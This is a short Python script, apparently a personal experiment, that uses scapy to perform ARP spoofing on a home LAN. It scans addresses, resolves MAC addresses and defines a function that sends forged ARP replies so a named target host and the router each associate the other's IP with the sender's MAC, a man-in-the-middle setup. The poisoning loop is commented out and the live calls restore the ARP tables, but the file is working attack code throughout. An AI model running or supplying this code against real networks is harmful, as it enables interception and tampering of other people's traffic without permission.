from scapy.all import srp1, srp, Ether, ARP, IP, ICMP, send
import time

def get_mac(ip):
    ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans.src

def lan_list():
    for i in range(192, 193):
        ip = f"192.168.178.{i}"
        ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout = 10, verbose=0)
        if ans is not None:
            print(ans)


def spoof(from_ip, to_ip, restore=False):
    from_mac = get_mac(from_ip)
    self_mac = ARP().hwsrc 
    
    hwsrc = self_mac
    if restore:
        hwsrc = get_mac(to_ip)

    send(ARP(pdst=from_ip, hwdst=from_mac, psrc=to_ip, hwsrc=hwsrc, op="is-at"), verbose=0)    
    print(f"Sent to {from_ip} : {to_ip} is-at {self_mac}")


target = "192.168.178.80"
router = "192.168.178.1"

# while True:
#     spoof(target, router)
#     spoof(router, target)
# 
#     time.sleep(1)

spoof(target, router, restore=True)
spoof(router, target, restore=True)
